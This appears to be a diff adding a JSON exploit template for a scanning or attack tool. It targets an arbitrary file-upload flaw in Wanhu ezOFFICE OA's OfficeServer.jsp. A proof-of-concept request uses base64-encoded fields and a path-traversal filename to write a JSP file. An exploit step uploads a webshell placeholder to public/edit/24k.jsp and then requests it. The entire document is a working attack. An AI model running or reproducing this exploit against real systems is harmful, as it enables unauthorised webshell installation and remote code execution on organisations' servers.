@@ -1,0 +1,36 @@
+{
+	"name":"万户-ezOFFICE-OA-officeserver.jsp文件上传",
+	"tag":"wanhu",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/defaultroot/public/iWebOfficeSign/OfficeServer.jsp",
+		"pocPost":"DBSTEP V3.0     145             0               105             DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\nRECORDID=\r\nisDoc=dHJ1ZQ==\r\nmoduleType=Z292ZG9jdW1lbnQ=\r\nFILETYPE=Ly8uLi8uLi9wdWJsaWMvZWRpdC83Yzc1QWYuanNw\r\n<% out.println(\"5EA635\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(DBSTEP)"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/defaultroot/public/iWebOfficeSign/OfficeServer.jsp",
+			"expPost":"DBSTEP V3.0     145             0               105             DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\nRECORDID=\r\nisDoc=dHJ1ZQ==\r\nmoduleType=Z292ZG9jdW1lbnQ=\r\nFILETYPE=Ly8uLi8uLi9wdWJsaWMvZWRpdC8yNGsuanNw\r\n{{webshell}}",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"(DBSTEP)"
+		},
+		"step2":{
+			"expGet":"/defaultroot/public/edit/24k.jsp",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
